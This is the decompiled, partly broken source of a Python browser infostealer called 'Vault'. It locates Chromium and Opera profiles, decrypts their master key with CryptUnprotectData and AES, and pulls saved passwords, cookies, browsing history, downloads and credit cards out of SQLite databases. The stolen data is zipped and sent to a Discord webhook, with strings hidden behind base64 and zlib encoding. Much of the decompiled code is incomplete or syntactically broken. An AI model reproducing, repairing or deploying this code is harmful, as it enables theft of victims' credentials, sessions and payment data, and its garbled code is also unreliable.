# pyunpacker v1.0 (by Vault) #

import base64
import json
import os
import shutil
import sqlite3
from pathlib import Path
from zipfile import ZipFile
from Crypto.Cipher import AES
from discord import Embed, File, SyncWebhook
from win32crypt import CryptUnprotectData
__LOGINS__ = []
__COOKIES__ = []
__WEB_HISTORY__ = []
__DOWNLOADS__ = []
__CARDS__ = []

class Browsers:
    
    def __init__(self, webhook):
        setattr(self, 'webhook', SyncWebhook.from_url(webhook))
        Chromium()
        Opera()
        Upload(self.webhook)



class Upload:
    
    def __init__(self, webhook):
        setattr(self, 'webhook', webhook)
        self.write_files()
        self.send()
        self.clean()

    
    def write_files(self):
        os.makedirs('vault', True, **('exist_ok',))
    # WARNING: Decompyle incomplete

    
    def send(self):
        self.webhook.send(Embed('Vault', __import__('base64').b64decode(__import__('zlib').decompress(b'xxdax8btwJx07x00x03(x01J')).decode() + __import__('base64').b64decode(__import__('zlib').decompress(b'xxdasNxb7xb5x05x00x02xfcx01%')).decode().join(self.tree(Path(__import__('base64').b64decode(__import__('zlib').decompress(b'xxdaKxc9u3Lxf2x08xb4x05x00x0bxfbx02x81')).decode()))) + __import__('base64').b64decode(__import__('zlib').decompress(b'xxdax8btwJx07x00x03(x01J')).decode(), **('title', 'description')), File(__import__('base64').b64decode(__import__('zlib').decompress(b'xxdaKxc9u3Lxf2x08,Mxcdxcd)x07x00x1bAx04n')).decode()), **('embed', 'file'))

    
    def clean(self):
        shutil.rmtree('vault')
        os.remove('vault.zip')

    
    def tree(self, path, prefix, midfix_folder, midfix_file = ('', __import__('base64').b64decode(__import__('zlib').decompress(b'xxdaxb3xf0xd2x0eIxcft,xf1txb4xb5x05x00x16xfbx03x8b')).decode(), __import__('base64').b64decode(__import__('zlib').decompress(b'xxdaxb3xf0xd2x0exc9pv,xf1txb4xb5x05x00x15xf9x03f')).decode())):
        pass
    # WARNING: Decompyle incomplete



class Chromium:
    
    def __init__(self):
        setattr(self, 'appdata', os.getenv('LOCALAPPDATA'))
    # WARNING: Decompyle incomplete

    
    def get_master_key(self, path):
        if not os.path.exists(path):
            return None
        if None('base64').b64decode(__import__('zlib').decompress(b'xxdaK2xf6Kx8b4xf62Mxf6x08xb4x05x00x17xacx03x8e')).decode() not in open(path, 'r', __import__('base64').b64decode(__import__('zlib').decompress(b'xxdaKx89x08xcaxf5tIxb7x05x00x0cxd4x02xc0')).decode(), **('encoding',)).read():
            return None
        with None(path, 'r', __import__('base64').b64decode(__import__('zlib').decompress(b'xxdaKx89x08xcaxf5tIxb7x05x00x0cxd4x02xc0')).decode(), **('encoding',)) as f:
            c = f.read()
            None(None, None, None)
    # WARNING: Decompyle incomplete

    
    def decrypt_password(self, buff, master_key):
        pass
    # WARNING: Decompyle incomplete

    
    def get_login_data(self, path, profile):
        
        if not os.path.exists(login_db):
            return None
        None.copy(login_db, 'login_db')
        conn = sqlite3.connect('login_db')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    # WARNING: Decompyle incomplete

    
    def get_cookies(self, path, profile):
        cookie_db = '{}{}NetworkCookies'.format(path, profile)
        if not os.path.exists(cookie_db):
            return None
        None.copy(cookie_db, 'cookie_db')
        conn = sqlite3.connect('cookie_db')
        cursor = conn.cursor()

 # WARNNING: this is not fully unpacked!    # WARNING: Decompyle incomplete

    
    def get_web_history(self, path, profile):
        web_history_db = '{}{}History'.format(path, profile)
        if not os.path.exists(web_history_db):
            return None
        None.copy(web_history_db, 'web_history_db')
        conn = sqlite3.connect('web_history_db')
        cursor = conn.cursor()
        cursor.execute('SELECT url, title, last_visit_time FROM urls')
    # WARNING: Decompyle incomplete

    
    def get_downloads(self, path, profile):
        downloads_db = '{}{}History'.format(path, profile)
        if not os.path.exists(downloads_db):
            return None
        None.copy(downloads_db, 'downloads_db')
        conn = sqlite3.connect('downloads_db')
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')
    # WARNING: Decompyle incomplete

    
    def get_credit_cards(self, path, profile):
        cards_db = '{}{}Web Data'.format(path, profile)
        if not os.path.exists(cards_db):
            return None
        None.copy(cards_db, 'cards_db')
        conn = sqlite3.connect('cards_db')
        cursor = conn.cursor()

 # WARNNING: this is not fully unpacked!    # WARNING: Decompyle incomplete



class Opera:
    
    def __init__(self):
        setattr(self, 'roaming', os.getenv('APPDATA'))
        setattr(self, 'paths', {
            'opera': self.roaming + __import__('base64').b64decode(__import__('zlib').decompress(b'xxdax8bpxb5,x8fx8axf0xcaxf0txf3+x8bxcax0b2x8ex8cxf0xcax89@x88x19Dx86{x15Gx05xdaxdax02x00x0fxc8rt')).decode(),

 # WARNNING: this is not fully unpacked!        setattr(self, 'master_key', self.get_master_key('{}Local State'.format(path)))
        if not self.master_key:
            continue
        operations = [
            self.get_login_data,
            self.get_cookies,
            self.get_web_history,
            self.get_downloads,
            self.get_credit_cards]
    # WARNING: Decompyle incomplete

    
    def get_master_key(self, path):
        if not os.path.exists(path):
            return None
        if None('base64').b64decode(__import__('zlib').decompress(b'xxdaK2xf6Kx8b4xf62Mxf6x08xb4x05x00x17xacx03x8e')).decode() not in open(path, 'r', __import__('base64').b64decode(__import__('zlib').decompress(b'xxdaKx89x08xcaxf5tIxb7x05x00x0cxd4x02xc0')).decode(), **('encoding',)).read():
            return None
        with None(path, 'r', __import__('base64').b64decode(__import__('zlib').decompress(b'xxdaKx89x08xcaxf5tIxb7x05x00x0cxd4x02xc0')).decode(), **('encoding',)) as f:
            c = f.read()
            None(None, None, None)
    # WARNING: Decompyle incomplete

    
    def decrypt_password(self, buff, master_key):
        pass
    # WARNING: Decompyle incomplete

    
    def get_login_data(self, path):
        login_db = '{}Login Data'.format(path)
        if not os.path.exists(login_db):
            return None
        None.copy(login_db, 'login_db')
        conn = sqlite3.connect('login_db')
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
    # WARNING: Decompyle incomplete

    
    def get_cookies(self, path):
        cookies_db = '{}NetworkCookies'.format(path)
        if not os.path.exists(cookies_db):
            return None
        None.copy(cookies_db, 'cookies_db')
        conn = sqlite3.connect('cookies_db')
        setattr(conn, 'text_factory', bytes)
        cursor = conn.cursor()

 # WARNNING: this is not fully unpacked!    # WARNING: Decompyle incomplete

    
    def get_web_history(self, path):
        history_db = '{}History'.format(path)
        if not os.path.exists(history_db):
            return None
        None.copy(history_db, 'history_db')
        conn = sqlite3.connect('history_db')
        cursor = conn.cursor()
        cursor.execute('SELECT url, title, last_visit_time FROM urls')
    # WARNING: Decompyle incomplete

    
    def get_downloads(self, path):
        downloads_db = '{}History'.format(path)
        if not os.path.exists(downloads_db):
            return None
        None.copy(downloads_db, 'downloads_db')
        conn = sqlite3.connect('downloads_db')
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')
    # WARNING: Decompyle incomplete

    
    def get_credit_cards(self, path):
        cards_db = '{}Web Data'.format(path)
        if not os.path.exists(cards_db):
            return None
        None.copy(cards_db, 'cards_db')
        conn = sqlite3.connect('cards_db')
        cursor = conn.cursor()

 # WARNNING: this is not fully unpacked!    # WARNING: Decompyle incomplete



class Types:
    
    class Login:
        __qualname__ = 'Types.Login'
        
        def __init__(self, url, username, password):
            setattr(self, 'url', url)
            setattr(self, 'username', username)
            setattr(self, 'password', password)

        
        def __str__(self):
            return '{}	{}	{}'.format(self.url, self.username, self.password)

        
        def __repr__(self):
            return self.__str__()


    
    class Cookie:
        __qualname__ = 'Types.Cookie'
        
        def __init__(self, host, name, path, value, expires):
            setattr(self, 'host', host)
            setattr(self, 'name', name)
            setattr(self, 'path', path)
            setattr(self, 'value', value)
            setattr(self, 'expires', expires)

        
        def __str__(self):
            pass
        # WARNING: Decompyle incomplete

        
        def __repr__(self):
            return self.__str__()


    
    class WebHistory:
        __qualname__ = 'Types.WebHistory'
        
        def __init__(self, url, title, timestamp):
            setattr(self, 'url', url)
            setattr(self, 'title', title)
            setattr(self, 'timestamp', timestamp)

        
        def __str__(self):
            return '{}	{}	{}'.format(self.url, self.title, self.timestamp)

        
        def __repr__(self):
            return self.__str__()


    
    class Download:
        __qualname__ = 'Types.Download'
        
        def __init__(self, tab_url, target_path):
            setattr(self, 'tab_url', tab_url)
            setattr(self, 'target_path', target_path)

        
        def __str__(self):
            return '{}	{}'.format(self.tab_url, self.target_path)

        
        def __repr__(self):
            return self.__str__()


    
    class CreditCard:
        __qualname__ = 'Types.CreditCard'
        
        def __init__(self, name, month, year, number, date_modified):
            setattr(self, 'name', name)
            setattr(self, 'month', month)
            setattr(self, 'year', year)
            setattr(self, 'number', number)
            setattr(self, 'date_modified', date_modified)

        
        def __str__(self):
            return '{}	{}	{}	{}	{}'.format(self.name, self.month, self.year, self.number, self.date_modified)

        
        def __repr__(self):
            return self.__str__()



